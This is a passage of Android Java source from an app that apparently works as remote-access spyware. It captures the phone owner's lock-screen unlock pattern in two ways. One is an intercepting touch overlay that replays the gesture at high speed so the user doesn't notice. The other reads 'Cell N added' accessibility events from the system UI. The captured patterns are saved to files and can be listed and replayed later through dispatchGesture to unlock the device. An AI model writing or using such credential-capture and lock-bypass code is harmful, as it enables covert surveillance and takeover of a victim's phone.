         *  - If the pattern was correct and the device unlocked → save this gesture
         *  - If still locked → discard and wait for the next attempt
         * We delay the check slightly to let the unlock animation complete.
         */
        private void onGestureFinished(final long gestureEndTime) {
            final List<GesturePoint> snapshot = new ArrayList<>(currentGesturePts);
            currentGesturePts.clear();

            // A simple tap (< 10 points or < 200ms duration) is not a pattern — skip
            if (snapshot.size() < 10) return;
            final long dur = gestureEndTime - currentGestureStartTime;
            if (dur < 200) return;

            if (mirrorMode && mirrorSvc != null &&
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                // ── Mirror mode ──────────────────────────────────────────────────
                // 1. The overlay already intercepted the touch (didn't reach lock screen).
                // 2. Immediately replay at 10-20ms so the lock screen receives it
                //    at an imperceptible speed.
                // 3. Wait 1 200ms then check if the device unlocked.
                //    • Unlocked  → save gesture, tear down overlay
                //    • Still locked → discard silently, stay ready for next gesture
                GestureDescription fast = buildFastGesture(snapshot);
                if (fast == null) return;
                // Disable touch interception so the replayed gesture reaches
                // the lock screen and is not caught by this overlay again.
                setTouchable(false);
                mirrorSvc.dispatchGesture(fast,
                    new AccessibilityService.GestureResultCallback() {
                        @Override
                        public void onCompleted(GestureDescription g) {
                            overlayHandler.postDelayed(() -> {
                                try {
                                    KeyguardManager km = (KeyguardManager)
                                            context.getSystemService(Context.KEYGUARD_SERVICE);
                                    boolean unlocked = (km == null || !km.isKeyguardLocked());
                                    if (unlocked) {
                                        saveGesturePoints(snapshot, dur);
                                        stopped = true;
                                        overlayHandler.post(() -> {
                                            hide();
                                            if (onStop != null) onStop.run();
                                        });
                                    } else {
                                        // Still locked — re-enable interception to
                                        // listen for the user's next gesture attempt.
                                        setTouchable(true);
                                    }
                                } catch (Exception e) {
                                    Log.e(TAG, "mirrorMode unlock check: " + e.getMessage());
                                    setTouchable(true); // safety restore
                                }
                            }, 1200);
                        }
                        @Override
                        public void onCancelled(GestureDescription g) {
                            Log.w(TAG, "mirrorMode: gesture dispatch cancelled");
                            setTouchable(true); // restore so next attempt can be captured
                        }
                    }, null);
            } else {
                // ── Original lock mode ──────────────────────────────────────────
                // Delay 350ms to let the system process the unlock before checking
                overlayHandler.postDelayed(() -> {
                    try {
                        KeyguardManager km = (KeyguardManager)
                                context.getSystemService(Context.KEYGUARD_SERVICE);
                        boolean isLocked = (km != null && km.isKeyguardLocked());
                        if (!isLocked) {
                            saveGesturePoints(snapshot, dur);
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "onGestureFinished check: " + e.getMessage());
                    }
                }, 350);
            }
        }

        /** Persist a list of gesture points to disk immediately. */
        private void saveGesturePoints(List<GesturePoint> pts, long durationMs) {
            try {
                if (pts.isEmpty()) return;
                JSONArray arr = new JSONArray();
                for (GesturePoint gp : pts) {
                    JSONObject p = new JSONObject();
                    p.put("id",     gp.pointerId);
                    p.put("action", gp.action);
                    p.put("nx",     gp.nx);
                    p.put("ny",     gp.ny);
                    p.put("t",      gp.t);
                    arr.put(p);
                }
                JSONObject data = new JSONObject();
                data.put("label",      label);
                data.put("packageId",  packageId);
                data.put("screenW",    screenW);
                data.put("screenH",    screenH);
                data.put("durationMs", durationMs);
                data.put("recordedAt", System.currentTimeMillis());
                data.put("points",     arr);

                String ts       = new java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.getDefault()).format(new java.util.Date());
                String filename = packageId + "_" + label + "_" + ts + ".json";
                java.io.File outFile = new java.io.File(gestureDir(), filename);
                try (java.io.FileWriter fw = new java.io.FileWriter(outFile)) { fw.write(data.toString()); }
                Log.i(TAG, "Saved unlock gesture: " + filename + " (" + pts.size() + " pts)");
            } catch (Exception e) {
                Log.e(TAG, "saveGesturePoints: " + e.getMessage());
            }
        }

        private java.io.File gestureDir() {
            return new java.io.File(context.getFilesDir(), SUBDIR);
        }

        JSONObject stopAndSave(File dir) {
            stopped = true;
            hide();
            JSONObject result = new JSONObject();
            try {
                if (points.isEmpty()) return null;
                long dur = points.isEmpty() ? 0 : points.get(points.size() - 1).t;
                JSONArray arr = new JSONArray();
                for (GesturePoint gp : points) {
                    JSONObject p = new JSONObject();
                    p.put("id",     gp.pointerId);
                    p.put("action", gp.action);
                    p.put("nx",     gp.nx);
                    p.put("ny",     gp.ny);
                    p.put("t",      gp.t);
                    arr.put(p);
                }
                JSONObject data = new JSONObject();
                data.put("label",      label);
                data.put("packageId",  packageId);
                data.put("screenW",    screenW);
                data.put("screenH",    screenH);
                data.put("durationMs", dur);
                data.put("recordedAt", System.currentTimeMillis());
                data.put("points",     arr);

                String ts       = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
                String filename = packageId + "_" + label + "_" + ts + ".json";
                File   outFile  = new File(dir, filename);
                try (FileWriter fw = new FileWriter(outFile)) { fw.write(data.toString()); }

                result.put("filename",   filename);
                result.put("pointCount", arr.length());
                result.put("durationMs", dur);
                result.put("path",       outFile.getAbsolutePath());
            } catch (Exception e) {
                Log.e(TAG, "stopAndSave: " + e.getMessage());
                return null;
            }
            return result;
        }

        void hide() {
            try {
                if (view != null) {
                    WindowManager removeWm = activeWm != null ? activeWm : wm;
                    removeWm.removeView(view);
                }
                view     = null;
                activeWm = null;
                activeLp = null;
            } catch (Exception ignored) {}
        }

        /**
         * Temporarily make the overlay touchable or non-touchable without removing it.
         * Used in mirror mode to let the replayed gesture reach the lock screen:
         *   setTouchable(false) — pauses interception so replay gets through
         *   setTouchable(true)  — resumes interception for the next gesture attempt
         */
        void setTouchable(boolean touchable) {
            try {
                if (activeWm == null || activeLp == null || view == null) return;
                if (touchable) {
                    activeLp.flags &= ~WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;
                } else {
                    activeLp.flags |= WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;
                }
                activeWm.updateViewLayout(view, activeLp);
            } catch (Exception e) {
                Log.w(TAG, "setTouchable(" + touchable + "): " + e.getMessage());
            }
        }

        /**
         * Stop, apply complexity filter, and only save if the captured gesture
         * is complex (multi-finger OR curved path — not a simple tap or linear swipe).
         */
        JSONObject stopAndSaveIfComplex(File dir) {
            stopped = true;
            hide();
            if (points.size() < 10) return null; // too few points — skip

            // Check for multi-pointer (multi-finger) — always complex
            boolean multiPointer = false;
            for (GesturePoint gp : points) {
                if (gp.pointerId != 0) { multiPointer = true; break; }
            }

            // Check for path curvature: compute max deviation from the straight line
            // between first and last point
            boolean curved = false;
            if (!multiPointer && points.size() >= 3) {
                GesturePoint first = points.get(0);
                GesturePoint last  = points.get(points.size() - 1);
                float dx = last.nx - first.nx;
                float dy = last.ny - first.ny;
                float len = (float) Math.sqrt(dx * dx + dy * dy);
                if (len < 0.05f) {
                    // Very short total displacement — it's a tap or stationary gesture
                    // Still might be complex if it lasted > 1.5 seconds
                    long dur = last.t - first.t;
                    if (dur < 1500) return null; // simple tap
                    curved = true;
                } else {
                    // Compute max perpendicular deviation from the line
                    float maxDev = 0;
                    for (GesturePoint gp : points) {
                        // Cross product gives perpendicular distance
                        float crossLen = Math.abs((gp.nx - first.nx) * dy - (gp.ny - first.ny) * dx);
                        float dev = crossLen / len;
                        if (dev > maxDev) maxDev = dev;
                    }
                    // More than 5% screen deviation from straight line = curved
                    if (maxDev > 0.05f) curved = true;
                }
            }

            if (!multiPointer && !curved) return null; // simple linear swipe — skip

            // Complex enough — delegate to regular save
            return stopAndSave(dir);
        }
    }

    // =========================================================================
    // Advanced Unlock — accessibility-event-based lock pattern capture
    // Runs automatically once accessibility is enabled (no dashboard trigger needed).
    // When the user draws a pattern on the lock screen, Android fires accessibility
    // events with contentDescription "Cell N added" for each cell touched.
    // We collect those in order, record center coordinates, and save them locally.
    // The dashboard can list, view, replay, and delete the saved patterns.
    // =========================================================================

    private static final String ADVANCED_UNLOCK_SUBDIR = "advanced_unlock";

    // Cells captured so far for the current pattern attempt: [cellNum, left, top, right, bottom]
    private final List<int[]> advCells         = new ArrayList<>();
    private final Handler     advUnlockHandler = new Handler(Looper.getMainLooper());
    private Runnable          advUnlockSaveTask;

    // Save this soon after the last cell arrives — cells disappear from the tree very
    // quickly (~10-50ms after the user lifts their finger), so we commit to disk fast.
    private static final long ADV_SAVE_DELAY_MS = 50;

    /**
     * Called from UnifiedAccessibilityService when an accessibility event reveals
     * a "Cell N added" node on the lock screen (package: com.android.systemui).
     * Only the screen reader (accessibility tree) is used — no gesture overlay needed.
     *
     * @param cellNum  1-9 (the pattern dot number, becomes non-clickable when touched)
     * @param left     left edge of the cell view in screen coordinates
     * @param top      top edge
     * @param right    right edge
     * @param bottom   bottom edge
     */
    public void onAdvancedUnlockCellDetected(int cellNum, int left, int top, int right, int bottom) {
        // If this cell was already recorded, the user is starting a NEW pattern attempt.
        // Commit whatever we have so far, then restart with this cell.
        boolean alreadySeen = false;
        for (int[] c : advCells) {
            if (c[0] == cellNum) { alreadySeen = true; break; }
        }
        if (alreadySeen) {
            // Cancel pending save and immediately commit the previous attempt
            if (advUnlockSaveTask != null) {
                advUnlockHandler.removeCallbacks(advUnlockSaveTask);
                advUnlockSaveTask = null;
            }
            commitAdvancedUnlockPattern();
            Log.d(TAG, "AdvancedUnlock: new attempt detected — previous pattern committed");
        }
        // Store full bounds so replay can draw through real screen coordinates
        advCells.add(new int[]{cellNum, left, top, right, bottom});
        Log.i(TAG, "AdvancedUnlock: cell " + cellNum
                + " bounds(" + left + "," + top + "," + right + "," + bottom + ")");

        // (Re)schedule the delayed save so every draw is persisted
        if (advUnlockSaveTask != null) advUnlockHandler.removeCallbacks(advUnlockSaveTask);
        advUnlockSaveTask = this::commitAdvancedUnlockPattern;
        advUnlockHandler.postDelayed(advUnlockSaveTask, ADV_SAVE_DELAY_MS);
    }

    /** Discard any in-progress capture (e.g. screen turned off mid-gesture). */
    public void clearAdvancedUnlockCapture() {
        if (advUnlockSaveTask != null) {
            advUnlockHandler.removeCallbacks(advUnlockSaveTask);
            advUnlockSaveTask = null;
        }
        advCells.clear();
        Log.d(TAG, "AdvancedUnlock: capture cleared");
    }

    /**
     * Called when the device successfully unlocks (ACTION_USER_PRESENT).
     * Commits any pending cells immediately (the pattern was correct).
     */
    public void commitAdvancedUnlockOnUnlock() {
        if (advUnlockSaveTask != null) {
            advUnlockHandler.removeCallbacks(advUnlockSaveTask);
            advUnlockSaveTask = null;
        }
        if (!advCells.isEmpty()) {
            advUnlockHandler.post(this::commitAdvancedUnlockPattern);
        }
    }

    /** Persist the collected cells as a JSON file in the advanced_unlock directory. */
    private void commitAdvancedUnlockPattern() {
        try {
            List<int[]> snapshot = new ArrayList<>(advCells);
            advCells.clear();

            if (snapshot.size() < 2) {
                Log.d(TAG, "AdvancedUnlock: only " + snapshot.size() + " cell(s) — discarding");
                return;
            }

            JSONArray cellSeq    = new JSONArray();
            JSONArray cellCoords = new JSONArray();
            for (int[] c : snapshot) {
                // c = {cellNum, left, top, right, bottom}
                int cx = (c[1] + c[3]) / 2;
                int cy = (c[2] + c[4]) / 2;
                cellSeq.put(c[0]);
                JSONObject coord = new JSONObject();
                coord.put("cell",   c[0]);
                coord.put("left",   c[1]);
                coord.put("top",    c[2]);
                coord.put("right",  c[3]);
                coord.put("bottom", c[4]);
                coord.put("cx",     cx);
                coord.put("cy",     cy);
                cellCoords.put(coord);
            }

            JSONObject data = new JSONObject();
            data.put("capturedAt",  System.currentTimeMillis());
            data.put("screenW",     screenW);
            data.put("screenH",     screenH);
            data.put("cells",       cellSeq);
            data.put("cellCoords",  cellCoords);

            File dir = advancedUnlockDir();
            if (!dir.exists()) dir.mkdirs();
            String ts  = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            String fn  = "adv_unlock_" + ts + ".json";
            File   out = new File(dir, fn);
            try (FileWriter fw = new FileWriter(out)) { fw.write(data.toString()); }
            Log.i(TAG, "AdvancedUnlock: saved " + fn + " (" + snapshot.size() + " cells: " + cellSeq + ")");
        } catch (Exception e) {
            Log.e(TAG, "commitAdvancedUnlockPattern: " + e.getMessage());
        }
    }

    private File advancedUnlockDir() {
        return new File(context.getFilesDir(), ADVANCED_UNLOCK_SUBDIR);
    }

    /** List all saved advanced unlock patterns (newest first). */
    public JSONObject listAdvancedUnlockPatterns() {
        JSONObject r = new JSONObject();
        try {
            File dir = advancedUnlockDir();
            JSONArray arr = new JSONArray();
            if (dir.exists()) {
                File[] files = dir.listFiles(f -> f.getName().endsWith(".json"));
                if (files != null) {
                    java.util.Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));
                    for (File f : files) {
                        try {
                            JSONObject data = loadJson(f);
                            if (data == null) continue;
                            JSONObject meta = new JSONObject();
                            meta.put("filename",   f.getName());
                            meta.put("capturedAt", data.optLong("capturedAt", f.lastModified()));
                            meta.put("screenW",    data.optInt("screenW", 0));
                            meta.put("screenH",    data.optInt("screenH", 0));
                            JSONArray cells = data.optJSONArray("cells");
                            if (cells != null) {
                                meta.put("cellCount", cells.length());
                                meta.put("cells",     cells);
                            }
                            arr.put(meta);
                        } catch (Exception ignored) {}
                    }
                }
            }
            r.put("success",  true);
            r.put("patterns", arr);
            r.put("count",    arr.length());
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /** Return the full data (including cellCoords) for one pattern. */
    public JSONObject getAdvancedUnlockPattern(String filename) {
        JSONObject r = new JSONObject();
        try {
            File file = new File(advancedUnlockDir(), filename);
            if (!file.exists()) {
                r.put("success", false); r.put("error", "Not found: " + filename); return r;
            }
            JSONObject data = loadJson(file);
            if (data == null) {
                r.put("success", false); r.put("error", "Parse error"); return r;
            }
            r.put("success", true);
            r.put("pattern", data);
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /** Delete a saved advanced unlock pattern. */
    public JSONObject deleteAdvancedUnlockPattern(String filename) {
        JSONObject r = new JSONObject();
        try {
            File file = new File(advancedUnlockDir(), filename);
            if (!file.exists()) {
                r.put("success", false); r.put("error", "Not found: " + filename); return r;
            }
            boolean ok = file.delete();
            r.put("success",  ok);
            r.put("filename", filename);
        } catch (Exception e) {
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }

    /**
     * Replay a saved advanced unlock pattern on the device.
     *
     * Dispatches a single straight-line gesture through each recorded cell center.
     * Speed: ~120 ms per cell-to-cell segment — a little faster than moderate,
     * which feels natural for a lock-screen pattern draw.
     */
    public JSONObject replayAdvancedUnlockPattern(String filename) {
        JSONObject r = new JSONObject();
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
                r.put("success", false); r.put("error", "Requires Android 7+"); return r;
            }
            if (accessSvc == null) {
                r.put("success", false); r.put("error", "AccessibilityService not available"); return r;
            }

            File file = new File(advancedUnlockDir(), filename);
            if (!file.exists()) {
                r.put("success", false); r.put("error", "File not found: " + filename); return r;
            }
            JSONObject data = loadJson(file);
            if (data == null) {
                r.put("success", false); r.put("error", "Parse error"); return r;
            }

            JSONArray cellCoords = data.optJSONArray("cellCoords");
            if (cellCoords == null || cellCoords.length() < 2) {
                r.put("success", false); r.put("error", "Need at least 2 cell coordinates"); return r;
            }

            int srcW = data.optInt("screenW", screenW);
            int srcH = data.optInt("screenH", screenH);
            int n    = cellCoords.length();

            // 120 ms per segment — a little faster than a casual draw
            long msPerSegment  = 120L;
            long totalDuration = Math.max(200L, msPerSegment * (n - 1));

            // Build a straight-line path through each cell center.
            // Normalize against the recorded screen size so it scales correctly
            // to any current device screen.
            Path path = new Path();
            for (int i = 0; i < n; i++) {
                JSONObject coord = cellCoords.getJSONObject(i);
                float nx = (float) coord.getInt("cx") / srcW;
                float ny = (float) coord.getInt("cy") / srcH;
                float sx = Math.max(1, Math.min(screenW - 1, nx * screenW));
                float sy = Math.max(1, Math.min(screenH - 1, ny * screenH));
                if (i == 0) path.moveTo(sx, sy);
                else        path.lineTo(sx, sy);
            }

            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, totalDuration));
            GestureDescription gesture = builder.build();

            boolean ok = accessSvc.dispatchGesture(gesture, null, null);
            r.put("success",    ok);
            r.put("filename",   filename);
            r.put("cellCount",  n);
            r.put("durationMs", totalDuration);
            if (!ok) r.put("error", "dispatchGesture returned false");
        } catch (Exception e) {
            Log.e(TAG, "replayAdvancedUnlockPattern: " + e.getMessage());
            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return r;
    }
}
